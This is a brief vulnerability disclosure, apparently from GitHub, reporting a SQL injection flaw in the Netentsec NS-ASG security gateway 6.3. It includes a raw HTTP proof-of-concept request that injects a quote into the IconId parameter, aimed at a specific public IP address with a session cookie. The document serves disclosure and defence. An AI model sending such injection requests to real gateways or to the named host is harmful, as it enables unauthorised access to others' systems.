Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ： /admin/list_resource_icon

https://218.75.78.54:4443/admin/index

Poc：
```
GET /admin/list_resource_icon.php?action=delete&IconId[]=1%27 HTTP/1.1
Host: 218.75.78.54:4443
Cookie: PHPSESSID=f30e8a16a1b6373bbc11e1ce84445033
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```
<img width="670" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/c7181c41-3aae-4454-81ce-13eca567dd90">
<img width="648" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/e21ccc9f-f347-4dd2-941b-cbaa175b683f">
